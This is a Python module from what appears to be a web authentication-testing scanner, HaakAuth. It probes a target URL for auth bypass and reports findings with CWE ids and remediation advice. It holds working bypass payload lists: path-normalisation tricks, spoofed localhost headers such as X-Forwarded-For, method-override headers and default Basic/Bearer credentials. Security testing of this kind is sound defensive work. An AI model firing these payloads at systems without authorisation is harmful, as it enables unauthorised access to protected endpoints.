"""
auth_bypass.py — Authentication and authorization bypass module for HaakAuth.

Tests implemented:
  1. HTTP Method Switching                  (CWE-287)
  2. Path Traversal Auth Bypass             (CWE-22)
  3. Header-Based Auth Bypass (IP spoofing) (CWE-290)
  4. Removing Auth Header                   (CWE-306)
  5. HTTP Method Override headers           (CWE-287)
  6. Content-Type Switching                 (CWE-436)
  7. API Version Bypass                     (CWE-287)
  8. Wildcard / Default Credential Check    (CWE-798)

Only stdlib + requests.
"""
from __future__ import annotations

import base64
import json
import re
from typing import Optional
from urllib.parse import urlparse, urlunparse, quote

from requests import Response

from auth_tester.core import AuthTester, BaseModule
from auth_tester.colors import (
    msg_fail, msg_info, msg_ok, msg_vuln, msg_warn, progress_bar, section,
)


# ─────────────────────────────────────────────────────────────────────────────
# Static data
# ─────────────────────────────────────────────────────────────────────────────

# HTTP methods to attempt in method-switching test
_HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]

# Headers that may trick the server into thinking the request is internal
_IP_BYPASS_HEADERS: list[dict[str, str]] = [
    {"X-Forwarded-For":            "127.0.0.1"},
    {"X-Real-IP":                  "127.0.0.1"},
    {"X-Custom-IP-Authorization":  "127.0.0.1"},
    {"X-Forwarded-Host":           "localhost"},
    {"X-Remote-IP":                "127.0.0.1"},
    {"X-Client-IP":                "127.0.0.1"},
    {"X-Host":                     "127.0.0.1"},
    {"X-Originating-IP":           "127.0.0.1"},
    {"True-Client-IP":             "127.0.0.1"},
    {"Cluster-Client-IP":          "127.0.0.1"},
    {"X-ProxyUser-IP":             "127.0.0.1"},
    {"Via":                        "1.1 localhost"},
    {"Forwarded":                  "for=127.0.0.1"},
    {"X-Original-URL":             "/"},
    {"X-Rewrite-URL":              "/"},
]

# Method override header names and values
_METHOD_OVERRIDE_VARIANTS: list[tuple[str, str]] = [
    ("X-HTTP-Method-Override", "GET"),
    ("X-HTTP-Method-Override", "PUT"),
    ("X-HTTP-Method-Override", "DELETE"),
    ("X-HTTP-Method",          "PUT"),
    ("X-Method-Override",      "DELETE"),
]

# Method override via query/body
_METHOD_OVERRIDE_PARAMS: list[str] = ["_method=PUT", "_method=DELETE", "_method=GET"]

# API version patterns to probe
_VERSION_RE = re.compile(r"/v(\d+)/", re.IGNORECASE)

# Common default/weak API credentials
_DEFAULT_AUTH_HEADERS: list[tuple[str, str]] = [
    ("Authorization", "Basic YWRtaW46YWRtaW4="),        # admin:admin
    ("Authorization", "Basic YWRtaW46cGFzc3dvcmQ="),    # admin:password
    ("Authorization", "Basic dGVzdDp0ZXN0"),             # test:test
    ("Authorization", "Basic dXNlcjp1c2Vy"),             # user:user
    ("Authorization", "Bearer test"),
    ("Authorization", "Bearer admin"),
    ("Authorization", "Bearer key"),
    ("Authorization", "Bearer api_key"),
    ("Authorization", "Bearer default"),
    ("X-API-Key",     "test"),
    ("X-API-Key",     "admin"),
    ("X-API-Key",     "default"),
    ("X-API-Key",     "apikey"),
]

# Content-Types to probe in content-type switching
_CONTENT_TYPES: list[tuple[str, str]] = [
    ("application/x-www-form-urlencoded", "field=value&test=haakauth"),
    ("text/xml; charset=utf-8",           "<?xml version=\"1.0\"?><root><test>haakauth</test></root>"),
    ("text/plain",                        "field=value"),
    ("multipart/form-data; boundary=----HaakAuthBoundary",
     "------HaakAuthBoundary\r\nContent-Disposition: form-data; name=\"test\"\r\n\r\nhaakauth\r\n------HaakAuthBoundary--"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Path bypass variants builder
# ─────────────────────────────────────────────────────────────────────────────

def _build_path_variants(original_path: str) -> list[str]:
    """
    Generate path variants that may bypass ACL middleware.
    The original_path should be something like /admin/dashboard.
    """
    p = original_path.rstrip("/") or "/"
    # Last component after final /
    parts = p.split("/")
    last  = parts[-1] if parts[-1] else (parts[-2] if len(parts) > 1 else "")
    # Remove last component to get parent
    parent = "/".join(parts[:-1]) or "/"

    if not last:
        return []

    return [
        f"{parent}/../{p.lstrip('/')}",            # /admin/../admin/dashboard
        f"/./{p.lstrip('/')}",                     # /./admin/dashboard
        f"//{p.lstrip('/')}",                      # //admin/dashboard
        f"{parent}/./{last}",                      # /admin/./dashboard
        p.upper(),                                  # /ADMIN/DASHBOARD
        quote(p, safe="/").replace("/", "%2f", 1), # %2fadmin/dashboard
        f"{p}/",                                    # /admin/dashboard/
        f"{p}/.",                                   # /admin/dashboard/.
        f"{p}/..;/{last}",                          # /admin/dashboard/..;/dashboard
        f"/{quote(last[0])}{last[1:]}",             # /%61dmin (first char URL-encoded)
        f"{p}%20",                                  # trailing space
        f"{p}%09",                                  # trailing tab
        f";{p}",                                    # semicolon prefix
        f"{p};",                                    # semicolon suffix
    ]


# ─────────────────────────────────────────────────────────────────────────────
# AuthBypassModule
# ─────────────────────────────────────────────────────────────────────────────

class AuthBypassModule(BaseModule):
    """Authentication and authorization bypass testing (8 test categories)."""

    NAME        = "auth_bypass"
    DESCRIPTION = (
        "Tests for auth bypass via method switching, path traversal, IP-spoofing headers, "
        "auth header removal, method override, content-type switching, "
        "API version downgrade, and default credentials."
    )
    _TOTAL_TESTS = 8

    def __init__(self, tester: AuthTester, options: Optional[dict] = None):
        super().__init__(tester, options)
        self._original_resp: Optional[Response] = None  # authenticated baseline
        self._unauth_resp:   Optional[Response] = None  # unauthenticated baseline
        self._done = 0

    # ─────────────────────────────────────────────────────────────────────────
    # Internal helpers
    # ─────────────────────────────────────────────────────────────────────────

    def _tick(self, label: str) -> None:
        self._done += 1
        progress_bar(self._done, self._TOTAL_TESTS, label)

    def _req(self, method: str, url: str, headers: Optional[dict] = None,
             data: Optional[str] = None, json_body: Optional[dict] = None,
             **kwargs) -> Optional[Response]:
        try:
            kw: dict = {"allow_redirects": False, **kwargs}
            if headers:
                kw["headers"] = headers
            if data is not None:
                kw["data"] = data
            if json_body is not None:
                kw["json"] = json_body
            return self.tester.request(method, url, **kw)
        except Exception as exc:
            msg_warn(f"  {method} {url[:60]} error: {exc}")
            return None

    def _get_clean(self, url: str,
                   extra_headers: Optional[dict] = None,
                   cookies: Optional[dict] = None) -> Optional[Response]:
        """GET without the session's Authorization header."""
        hdrs = {k: v for k, v in self.tester.session.headers.items()
                if k.lower() != "authorization"}
        if extra_headers:
            hdrs.update(extra_headers)
        return self._req("GET", url, headers=hdrs, cookies=cookies or {})

    def _success(self, resp: Optional[Response]) -> bool:
        return resp is not None and resp.status_code < 400

    def _body(self, resp: Response, limit: int = 300) -> str:
        try:
            return resp.text[:limit].replace("\n", " ")
        except Exception:
            return "<undecodable>"

    def _is_bypass(self, resp: Optional[Response]) -> bool:
        """
        True if *resp* looks like a bypass: the unauthenticated baseline was
        rejected (4xx) but *resp* succeeded (2xx/3xx).
        Also True if we have no unauthenticated baseline but resp succeeds.
        """
        if resp is None:
            return False
        if self._unauth_resp is not None:
            return self._unauth_resp.status_code >= 400 and resp.status_code < 400
        return resp.status_code < 400

    # ─────────────────────────────────────────────────────────────────────────
    # Baselines
    # ─────────────────────────────────────────────────────────────────────────

    def _get_baselines(self) -> None:
        # Authenticated
        try:
            self._original_resp = self.tester.get(
                self.tester.target_url, allow_redirects=False)
            msg_info(f"Authenticated baseline  : {self._original_resp.status_code}")
        except Exception as exc:
            msg_warn(f"Authenticated baseline failed: {exc}")

        # Unauthenticated
        self._unauth_resp = self._get_clean(self.tester.target_url)
        if self._unauth_resp:
            msg_info(f"Unauthenticated baseline: {self._unauth_resp.status_code}")
        else:
            msg_warn("Unauthenticated baseline failed")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 1 — HTTP Method Switching
    # ─────────────────────────────────────────────────────────────────────────

    def _test_method_switching(self) -> None:
        msg_info("Test 1/8: HTTP Method Switching")
        url = self.tester.target_url
        original_method = self.options.get("method", "GET").upper()

        methods_to_try = [m for m in _HTTP_METHODS if m != original_method]

        found = False
        for i, method in enumerate(methods_to_try):
            progress_bar(i + 1, len(methods_to_try), method)
            resp = self._get_clean(url) if method == "GET" else self._req(method, url)
            if resp is None:
                continue

            if self._is_bypass(resp):
                msg_vuln("high", f"Method switching: {method} bypasses auth → {resp.status_code}")
                self.finding(
                    severity="high",
                    title=f"Auth Bypass via HTTP Method Switching ({method})",
                    description=(
                        f"The server returns {resp.status_code} for {method} but "
                        f"rejected {original_method} without auth. "
                        "Authentication middleware may not cover all HTTP methods."
                    ),
                    evidence=(
                        f"Method: {method} → {resp.status_code}\n"
                        f"Unauth {original_method} → {self._unauth_resp.status_code if self._unauth_resp else 'N/A'}\n"
                        f"Body: {self._body(resp)}"
                    ),
                    cwe="CWE-287",
                    remediation=(
                        "Apply authentication middleware to all HTTP methods uniformly. "
                        "Do not assume that only GET or POST requests require authorization."
                    ),
                    request_data=self._request_data(method, url, {}),
                    response_data=self._response_data(resp),
                    references=["https://cwe.mitre.org/data/definitions/287.html"],
                )
                found = True
            else:
                msg_fail(f"  {method} → {resp.status_code if resp else 'error'}")

        if not found:
            msg_ok("Method switching: auth enforced across all HTTP methods")
        self._tick("method switching")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 2 — Path Traversal Auth Bypass
    # ─────────────────────────────────────────────────────────────────────────

    def _test_path_traversal(self) -> None:
        msg_info("Test 2/8: Path Traversal Auth Bypass")
        parsed = urlparse(self.tester.target_url)
        base   = f"{parsed.scheme}://{parsed.netloc}"
        path   = parsed.path or "/"
        query  = f"?{parsed.query}" if parsed.query else ""

        variants = _build_path_variants(path)
        if not variants:
            msg_info("  Cannot generate path variants for this URL — skipping")
            self._tick("path traversal"); return

        found = False
        for i, variant_path in enumerate(variants):
            progress_bar(i + 1, len(variants), variant_path[:40])
            test_url = f"{base}{variant_path}{query}"
            resp = self._get_clean(test_url)
            if resp is None:
                continue

            if self._is_bypass(resp):
                msg_vuln("high", f"Path traversal bypass: {variant_path!r} → {resp.status_code}")
                self.finding(
                    severity="high",
                    title=f"Auth Bypass via Path Traversal ({variant_path!r})",
                    description=(
                        f"The path variant '{variant_path}' returned HTTP {resp.status_code} "
                        "without authentication. The ACL or routing middleware may be matching "
                        "on the raw path before normalization."
                    ),
                    evidence=(
                        f"Original path: {path}\n"
                        f"Bypass path:   {variant_path}\n"
                        f"Status: {resp.status_code}\nBody: {self._body(resp)}"
                    ),
                    cwe="CWE-22",
                    remediation=(
                        "Normalize and canonicalize URL paths before applying access control rules. "
                        "Apply authorization at the application layer, after all middleware decoding."
                    ),
                    request_data=self._request_data("GET", test_url, {}),
                    response_data=self._response_data(resp),
                    references=[
                        "https://owasp.org/www-community/attacks/Path_Traversal",
                        "https://cwe.mitre.org/data/definitions/22.html",
                    ],
                )
                found = True
            else:
                msg_fail(f"  {variant_path!r} → {resp.status_code if resp else 'error'}")

        if not found:
            msg_ok("Path traversal: all path variants correctly rejected")
        self._tick("path traversal")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 3 — Header-Based Auth Bypass (IP spoofing)
    # ─────────────────────────────────────────────────────────────────────────

    def _test_header_bypass(self) -> None:
        msg_info("Test 3/8: Header-Based Auth Bypass (IP spoofing)")
        url = self.tester.target_url

        found = False
        for i, hdr_dict in enumerate(_IP_BYPASS_HEADERS):
            progress_bar(i + 1, len(_IP_BYPASS_HEADERS),
                         f"{list(hdr_dict.keys())[0]}")
            resp = self._get_clean(url, extra_headers=hdr_dict)
            if resp is None:
                continue

            if self._is_bypass(resp):
                hdr_name = list(hdr_dict.keys())[0]
                hdr_val  = list(hdr_dict.values())[0]
                msg_vuln("high", f"Header bypass: {hdr_name}: {hdr_val} → {resp.status_code}")
                self.finding(
                    severity="high",
                    title=f"Auth Bypass via {hdr_name} Header",
                    description=(
                        f"Adding '{hdr_name}: {hdr_val}' caused the server to bypass "
                        "authentication. The server trusts client-supplied headers for "
                        "internal/localhost IP detection, which can be spoofed by any client."
                    ),
                    evidence=(
                        f"Header: {hdr_name}: {hdr_val}\n"
                        f"Status without auth: {self._unauth_resp.status_code if self._unauth_resp else 'N/A'}\n"
                        f"Status with bypass header: {resp.status_code}\n"
                        f"Body: {self._body(resp)}"
                    ),
                    cwe="CWE-290",
                    remediation=(
                        "Do not use X-Forwarded-For, X-Real-IP, or similar headers to determine "
                        "whether a request is 'internal'. If these headers are needed for logging, "
                        "ensure they never influence authentication or authorization decisions."
                    ),
                    request_data=self._request_data("GET", url, hdr_dict),
                    response_data=self._response_data(resp),
                    references=[
                        "https://owasp.org/www-project-web-security-testing-guide/",
                        "https://cwe.mitre.org/data/definitions/290.html",
                    ],
                )
                found = True
            else:
                msg_fail(f"  {list(hdr_dict.keys())[0]} → {resp.status_code if resp else 'error'}")

        if not found:
            msg_ok("Header bypass: all IP-spoofing headers rejected")
        self._tick("header bypass")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 4 — Removing Auth Header
    # ─────────────────────────────────────────────────────────────────────────

    def _test_remove_auth(self) -> None:
        msg_info("Test 4/8: Removing Auth Header")

        variants: list[tuple[str, dict]] = [
            ("no_authorization",  {}),
            ("empty_bearer",      {"Authorization": "Bearer "}),
            ("empty_auth",        {"Authorization": ""}),
            ("no_cookies",        {}),  # handled separately below
        ]

        found = False
        for label, extra_hdrs in variants:
            if label == "no_cookies":
                # Try with cookies stripped too
                resp = self._req("GET", self.tester.target_url,
                                 headers={k: v for k, v in self.tester.session.headers.items()
                                          if k.lower() != "authorization"},
                                 cookies={})
            else:
                resp = self._get_clean(self.tester.target_url, extra_headers=extra_hdrs)

            if resp is None:
                continue

            if self._success(resp):
                msg_vuln("critical", f"Unauthenticated access: {label} → {resp.status_code}")
                self.finding(
                    severity="critical",
                    title=f"Endpoint Accessible Without Authentication ({label})",
                    description=(
                        f"Sending the request with '{label.replace('_', ' ')}' returned "
                        f"HTTP {resp.status_code}. The endpoint does not enforce authentication."
                    ),
                    evidence=(
                        f"Variant: {label}\n"
                        f"Status: {resp.status_code}\nBody: {self._body(resp)}"
                    ),
                    cwe="CWE-306",
                    remediation=(
                        "Enforce authentication on every protected endpoint. "
                        "Validate that the Authorization header is present and non-empty "
                        "before processing the request."
                    ),
                    request_data=self._request_data("GET", self.tester.target_url, extra_hdrs),
                    response_data=self._response_data(resp),
                    references=["https://cwe.mitre.org/data/definitions/306.html"],
                )
                found = True
            else:
                msg_fail(f"  {label} → {resp.status_code if resp else 'error'}")

        if not found:
            msg_ok("Auth removal: all variants correctly rejected")
        self._tick("remove auth")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 5 — HTTP Method Override
    # ─────────────────────────────────────────────────────────────────────────

    def _test_method_override(self) -> None:
        msg_info("Test 5/8: HTTP Method Override")
        url = self.tester.target_url

        found = False

        # Header-based overrides (sent as POST without auth)
        for hdr_name, method_val in _METHOD_OVERRIDE_VARIANTS:
            resp = self._get_clean(url, extra_headers={hdr_name: method_val})
            # Also test via POST
            resp_post = self._req("POST", url,
                                  headers={**{k: v for k, v in self.tester.session.headers.items()
                                              if k.lower() != "authorization"},
                                           hdr_name: method_val})
            for label, r in [(f"GET+{hdr_name}:{method_val}", resp),
                             (f"POST+{hdr_name}:{method_val}", resp_post)]:
                if r is None:
                    continue
                if self._is_bypass(r):
                    msg_vuln("medium", f"Method override: {label} → {r.status_code}")
                    self.finding(
                        severity="medium",
                        title=f"Auth Bypass via HTTP Method Override ({hdr_name})",
                        description=(
                            f"The server honored '{hdr_name}: {method_val}', "
                            "potentially allowing a method that bypasses access control checks."
                        ),
                        evidence=f"{label} → {r.status_code}\nBody: {self._body(r)}",
                        cwe="CWE-287",
                        remediation=(
                            "Disable HTTP method override middleware unless explicitly required. "
                            "If required, apply the same authorization checks regardless of the "
                            "override header value."
                        ),
                        request_data=self._request_data("POST", url, {hdr_name: method_val}),
                        response_data=self._response_data(r),
                        references=["https://cwe.mitre.org/data/definitions/287.html"],
                    )
                    found = True
                else:
                    msg_fail(f"  {label} → {r.status_code if r else 'error'}")

        # Query-string override (_method=PUT etc.)
        parsed = urlparse(url)
        base   = urlunparse(parsed._replace(query=""))
        existing_qs = f"&{parsed.query}" if parsed.query else ""

        for param_val in _METHOD_OVERRIDE_PARAMS:
            test_url = f"{base}?{param_val}{existing_qs}"
            resp = self._get_clean(test_url)
            if resp is None:
                continue
            if self._is_bypass(resp):
                msg_vuln("medium", f"Query override: {param_val} → {resp.status_code}")
                self.finding(
                    severity="medium",
                    title=f"Auth Bypass via Query-String Method Override ({param_val})",
                    description=(
                        f"Adding '{param_val}' to the query string returned HTTP "
                        f"{resp.status_code} without authentication."
                    ),
                    evidence=f"URL: {test_url}\nStatus: {resp.status_code}\nBody: {self._body(resp)}",
                    cwe="CWE-287",
                    remediation="Disable query-string method override or apply full authorization regardless.",
                    request_data=self._request_data("GET", test_url, {}),
                    response_data=self._response_data(resp),
                )
                found = True
            else:
                msg_fail(f"  {param_val} → {resp.status_code if resp else 'error'}")

        if not found:
            msg_ok("Method override: no bypass detected")
        self._tick("method override")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 6 — Content-Type Switching
    # ─────────────────────────────────────────────────────────────────────────

    def _test_content_type_switch(self) -> None:
        msg_info("Test 6/8: Content-Type Switching")
        url = self.tester.target_url

        # Capture the original content type from the authenticated request
        original_ct = ""
        if self._original_resp:
            original_ct = self._original_resp.request.headers.get(
                "Content-Type", "") if hasattr(self._original_resp, "request") and self._original_resp.request else ""

        found = False
        clean_hdrs = {k: v for k, v in self.tester.session.headers.items()
                      if k.lower() != "authorization"}

        for ct, body in _CONTENT_TYPES:
            if ct.split(";")[0].strip() == original_ct.split(";")[0].strip():
                continue  # Skip same content type

            test_hdrs = {**clean_hdrs, "Content-Type": ct}
            resp = self._req("POST", url, headers=test_hdrs, data=body)
            if resp is None:
                continue

            if self._success(resp):
                msg_vuln("medium", f"Content-Type switch: {ct.split(';')[0]!r} → {resp.status_code}")
                self.finding(
                    severity="medium",
                    title=f"Auth Bypass via Content-Type Switch ({ct.split(';')[0]})",
                    description=(
                        f"Sending a POST request with Content-Type: {ct} returned HTTP "
                        f"{resp.status_code} without authentication. "
                        "WAF or authentication middleware may only inspect specific content types."
                    ),
                    evidence=(
                        f"Content-Type: {ct}\n"
                        f"Body: {body[:100]}\n"
                        f"Status: {resp.status_code}"
                    ),
                    cwe="CWE-436",
                    remediation=(
                        "Enforce authentication regardless of Content-Type. "
                        "Do not rely on content-type-specific WAF or middleware rules for security."
                    ),
                    request_data=self._request_data("POST", url,
                                                    {"Content-Type": ct}, body[:200]),
                    response_data=self._response_data(resp),
                    references=["https://cwe.mitre.org/data/definitions/436.html"],
                )
                found = True
            else:
                msg_fail(f"  {ct.split(';')[0]!r} → {resp.status_code if resp else 'error'}")

        if not found:
            msg_ok("Content-Type switching: no bypass detected")
        self._tick("content-type switch")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 7 — API Version Bypass
    # ─────────────────────────────────────────────────────────────────────────

    def _test_api_version_bypass(self) -> None:
        msg_info("Test 7/8: API Version Bypass")
        url    = self.tester.target_url
        parsed = urlparse(url)
        path   = parsed.path

        match = _VERSION_RE.search(path)
        if not match:
            msg_info("  No versioned path pattern detected (e.g. /v2/) — skipping")
            self._tick("api version"); return

        current_version = int(match.group(1))
        versions_to_try = set()
        for delta in range(-3, 4):
            v = current_version + delta
            if v >= 0 and v != current_version:
                versions_to_try.add(v)
        # Also try non-numeric common paths
        alt_prefixes = ["api", "api/v1", "api/v2", "api/v0", "rest", "internal"]

        found = False

        for v in sorted(versions_to_try):
            new_path = _VERSION_RE.sub(f"/v{v}/", path, count=1)
            test_url = urlunparse(parsed._replace(path=new_path))
            resp = self._get_clean(test_url)
            if resp is None:
                continue

            if self._is_bypass(resp):
                msg_vuln("high", f"API version bypass: /v{v}/ → {resp.status_code}")
                self.finding(
                    severity="high",
                    title=f"Auth Bypass via API Version Downgrade (/v{v}/)",
                    description=(
                        f"The older API version /v{v}/ returned HTTP {resp.status_code} "
                        "without authentication. Older API versions may lack security controls "
                        "present in the current version."
                    ),
                    evidence=(
                        f"Current version: /v{current_version}/\n"
                        f"Probe version:  /v{v}/ → {resp.status_code}\n"
                        f"URL: {test_url}\nBody: {self._body(resp)}"
                    ),
                    cwe="CWE-287",
                    remediation=(
                        "Apply the same authentication and authorization controls to all API versions. "
                        "Deprecate old versions that cannot be secured. "
                        "Redirect or block access to outdated API endpoints."
                    ),
                    request_data=self._request_data("GET", test_url, {}),
                    response_data=self._response_data(resp),
                    references=[
                        "https://owasp.org/www-project-api-security/",
                        "https://cwe.mitre.org/data/definitions/287.html",
                    ],
                )
                found = True
            else:
                msg_fail(f"  /v{v}/ → {resp.status_code if resp else 'error'}")

        # Try alternate prefix paths
        for prefix in alt_prefixes:
            new_path = _VERSION_RE.sub(f"/{prefix}/", path, count=1)
            test_url = urlunparse(parsed._replace(path=new_path))
            resp = self._get_clean(test_url)
            if resp is None:
                continue
            if self._is_bypass(resp):
                msg_vuln("medium", f"API path bypass: /{prefix}/ → {resp.status_code}")
                self.finding(
                    severity="medium",
                    title=f"Auth Bypass via Alternate API Path (/{prefix}/)",
                    description=(
                        f"The alternate path prefix /{prefix}/ returned HTTP {resp.status_code} "
                        "without authentication."
                    ),
                    evidence=f"URL: {test_url}\nStatus: {resp.status_code}",
                    cwe="CWE-287",
                    remediation="Enforce authentication on all API path prefixes.",
                    request_data=self._request_data("GET", test_url, {}),
                    response_data=self._response_data(resp),
                )
                found = True
            else:
                msg_fail(f"  /{prefix}/ → {resp.status_code if resp else 'error'}")

        if not found:
            msg_ok("API version bypass: all version variants rejected")
        self._tick("api version")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 8 — Wildcard / Default Credential Check
    # ─────────────────────────────────────────────────────────────────────────

    def _test_default_credentials(self) -> None:
        msg_info("Test 8/8: Wildcard / Default Credential Check")
        url = self.tester.target_url

        # Strip original auth from session headers
        clean_hdrs = {k: v for k, v in self.tester.session.headers.items()
                      if k.lower() not in ("authorization", "x-api-key")}

        found = False
        for i, (hdr_name, hdr_val) in enumerate(_DEFAULT_AUTH_HEADERS):
            progress_bar(i + 1, len(_DEFAULT_AUTH_HEADERS), f"{hdr_name}:{hdr_val[:20]}")
            test_hdrs = {**clean_hdrs, hdr_name: hdr_val}
            resp = self._req("GET", url, headers=test_hdrs)
            if resp is None:
                continue

            if self._success(resp):
                # Decode credential hint for evidence
                hint = hdr_val
                if hdr_val.startswith("Basic "):
                    try:
                        hint = base64.b64decode(hdr_val[6:]).decode("utf-8", errors="replace")
                    except Exception:
                        pass

                msg_vuln("critical", f"Default credential accepted: {hdr_name}={hdr_val!r} → {resp.status_code}")
                self.finding(
                    severity="critical",
                    title=f"Default / Weak Credential Accepted ({hdr_name})",
                    description=(
                        f"The server accepted the default or weak credential "
                        f"'{hdr_name}: {hdr_val}' (decoded: {hint!r}). "
                        "Default credentials allow full unauthenticated access to the application."
                    ),
                    evidence=(
                        f"Header: {hdr_name}: {hdr_val}\n"
                        f"Decoded: {hint}\n"
                        f"Status: {resp.status_code}\nBody: {self._body(resp)}"
                    ),
                    cwe="CWE-798",
                    remediation=(
                        "Remove all default, hardcoded, and weak credentials. "
                        "Require credential rotation on first login. "
                        "Implement account lockout after repeated failed attempts."
                    ),
                    request_data=self._request_data("GET", url, {hdr_name: hdr_val}),
                    response_data=self._response_data(resp),
                    references=[
                        "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password",
                        "https://cwe.mitre.org/data/definitions/798.html",
                    ],
                )
                found = True
            else:
                msg_fail(f"  {hdr_name}={hdr_val[:30]!r} → {resp.status_code if resp else 'error'}")

        if not found:
            msg_ok("Default credentials: no weak credentials accepted")
        self._tick("default creds")

    # ─────────────────────────────────────────────────────────────────────────
    # run()
    # ─────────────────────────────────────────────────────────────────────────

    def run(self) -> None:
        section(f"Module: {self.NAME}")
        msg_info(f"Target : {self.tester.target_url}")

        # Capture baselines (authenticated + unauthenticated) before any tests
        self._get_baselines()

        self._test_method_switching()
        self._test_path_traversal()
        self._test_header_bypass()
        self._test_remove_auth()
        self._test_method_override()
        self._test_content_type_switch()
        self._test_api_version_bypass()
        self._test_default_credentials()

        msg_info(
            f"Auth bypass module complete — {self.tester.request_count} total requests, "
            f"{len(self.tester.get_findings())} total findings so far"
        )
